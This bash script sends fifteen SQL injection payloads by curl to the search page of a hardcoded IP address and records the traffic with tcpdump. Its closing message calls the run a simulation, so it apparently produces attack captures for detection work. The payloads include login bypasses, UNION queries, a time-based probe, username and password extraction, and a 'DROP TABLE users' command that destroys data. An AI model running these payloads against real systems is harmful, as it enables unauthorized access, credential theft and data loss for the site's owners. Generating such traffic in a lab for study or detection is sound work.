#!/bin/bash

TARGET="http://205.174.165.68/search.php"
INTERFACE="eth0"
PCAP_FILE="pcap/sql_injection_$(date +%Y%m%d_%H%M%S).pcap"

PAYLOADS=(
  "' OR '1'='1"
  "' OR 1=1--"
  "' OR 'a'='a"
  "' OR 1=1#"
  "' OR 1=1/*"
  "admin' --"
  "'; DROP TABLE users;--"
  "' OR sleep(5)--"
  "' AND 1=0 UNION SELECT null, version();--"
  "' AND EXISTS(SELECT * FROM users)--"
  "' OR (SELECT COUNT(*) FROM users) > 0--"
  "' OR 'abc' = 'abc"
  "1' OR '1' = '1"
  "' UNION ALL SELECT NULL,NULL,NULL--"
  "' OR 1 GROUP BY concat(username,0x3a,password) FROM users--"
)

echo "[*] Starting tcpdump..."
sudo tcpdump -i "$INTERFACE" host 205.174.165.68 -w "$PCAP_FILE" &
TCPDUMP_PID=$!

for payload in "${PAYLOADS[@]}"; do
  curl -s "$TARGET?query=$(printf %s "$payload" | jq -s -R -r @uri)" > /dev/null
done

kill "$TCPDUMP_PID"
echo "[✅] SQL Injection simulation complete. PCAP saved to $PCAP_FILE"
